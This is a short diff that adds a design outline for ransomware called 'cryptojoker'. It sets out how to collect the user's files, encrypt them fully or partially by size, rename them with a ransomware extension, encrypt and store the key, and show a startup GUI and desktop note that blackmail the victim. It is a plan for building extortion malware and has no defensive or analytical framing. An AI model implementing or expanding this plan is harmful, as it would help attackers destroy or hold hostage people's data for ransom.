@@ -1,0 +1,21 @@
+﻿
+	ENCRYPTION PHASE
+
+--Step One(Preparation)--
+1.Get all files in the current user folder.
+
+--Step Two(Encryption)--
+2.Encrypt the file depending on it's size. If it is a text document with maximum 2GB
+then encrypt it fully. Else encrypt only partially.
+
+3. Change the file extension. Add the proper keyword if it is partially or fully encrypted and
+then the ransomware extension(.cryptojoker).
+
+For example: filename.exe.partially.cryptojoker
+                
+--Step Three(Information storage and user notify)--
+4. After the step two has been completed(encryption step), then get the encryption key
+and save it in the appdata folder, encrypted with the RSA algorithm using the public key.
+
+5. Add the GUI + a text file in the desktop that will notify the user for being blackmailed.
+The GUI should be added to the computer startup.
